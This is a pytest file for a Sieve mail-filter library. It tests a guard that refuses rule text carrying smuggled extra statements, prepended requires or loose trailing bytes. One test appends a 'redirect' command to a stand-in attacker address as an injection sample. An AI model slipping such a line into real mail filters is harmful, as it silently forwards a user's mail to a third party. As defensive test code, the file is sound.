"""
The verbatim path cannot be used to smuggle text (areyousievious-8fg.14).

`source` crosses the wire, so a client can propose any bytes it likes and ask
us to write them to the user's mail server unaltered. The guard re-parses what
it is given: the span must yield exactly this entry and nothing else — no
extra statement, no `require`, no preamble, no tail. It fails CLOSED, so an
entry it cannot vouch for is regenerated rather than trusted.

Run from the backend/ directory:
    cd backend && python -m pytest tests/test_span_injection_guard.py -v
"""

from __future__ import annotations

import sieve_transform as st


def _round_tripped(text: str) -> st.Entry:
    """The single entry `text` parses to, span and all."""
    entries = st.parse_sieve(text).entries
    assert len(entries) == 1, entries
    return entries[0]


def test_a_span_the_parser_itself_produced_is_faithful():
    entry = _round_tripped(
        '# --- Spam ---\nif header :contains "subject" "spam" {\n  fileinto "Junk";\n}\n'
    )
    assert st.span_is_faithful(entry)


def test_an_empty_span_is_not_faithful():
    """A Rule the builder minted has nothing to re-emit."""
    assert not st.span_is_faithful(st.Rule(name="New"))


def test_a_span_carrying_a_second_statement_is_refused():
    """The smuggling case: the span parses to the right rule PLUS a command
    the user never wrote. Two entries, so the guard refuses it."""
    entry = _round_tripped("if true {\n  keep;\n}\n")
    entry.source += 'redirect "attacker@example.com";\n'
    assert not st.span_is_faithful(entry)


def test_a_span_carrying_a_require_is_refused():
    entry = _round_tripped("if true {\n  keep;\n}\n")
    entry.source = 'require ["vacation"];\n' + entry.source
    assert not st.span_is_faithful(entry)


# A rule the parser RECOGNISES. `if true { ... }` is a RawBlock — `true` is
# not a test the builder can edit — so it has no `.actions` to change, and the
# two tests below are about editing a field of a Rule.
_AN_EDITABLE_RULE = 'if header :contains "subject" "receipt" {\n  fileinto "Junk";\n}\n'


def test_a_span_whose_meaning_differs_from_the_entry_is_refused():
    """The edited-rule case, which is the common one: the client changed the
    folder, so the span no longer describes the entry and must regenerate."""
    entry = _round_tripped(_AN_EDITABLE_RULE)
    entry.actions[0].argument = "Inbox"
    assert not st.span_is_faithful(entry)


def test_a_reverted_edit_is_faithful_again():
    """Dirty is a comparison, not a flag: changed-and-changed-back is clean."""
    entry = _round_tripped(_AN_EDITABLE_RULE)
    entry.actions[0].argument = "Inbox"
    entry.actions[0].argument = "Junk"
    assert st.span_is_faithful(entry)


def test_a_raw_block_span_is_guarded_the_same_way():
    entry = _round_tripped('vacation :days 7 "Away";\n')
    assert isinstance(entry, st.RawBlock)
    assert st.span_is_faithful(entry)
    entry.text = "discard;"
    assert not st.span_is_faithful(entry)


def test_a_span_carrying_loose_bytes_after_the_entry_is_refused():
    """Not in the plan's seven; added because deleting the `reparsed.tail`
    term broke none of them, and the term turns out to be load-bearing rather
    than defensive. A comment appended to an honest span re-parses to the same
    single entry — the rule compares equal, so value equality waves it through
    — and the loose bytes ride out verbatim on the back of it."""
    entry = _round_tripped(_AN_EDITABLE_RULE)
    entry.source += "\n# smuggled trailing note\n"
    assert not st.span_is_faithful(entry)


def test_a_span_carrying_loose_bytes_before_the_entry_is_refused():
    """The other end, and the reason `no requires` does not already cover it:
    `require [];` declares NOTHING, so `reparsed.requires` is empty and that
    check never fires. The statement and the blank lines above it land in
    `preamble` instead, and the rule below re-parses value-equal to this entry
    — so preamble is the only term that refuses it, and without it those bytes
    would be written to the mail server verbatim.

    Blank lines rather than a comment on purpose: a comment here is absorbed as
    the rule's NAME, which makes value equality refuse the span and would leave
    this test passing for a reason that has nothing to do with the preamble.
    """
    entry = _round_tripped(_AN_EDITABLE_RULE)
    entry.source = "\n\nrequire [];\n" + entry.source
    assert not st.span_is_faithful(entry)
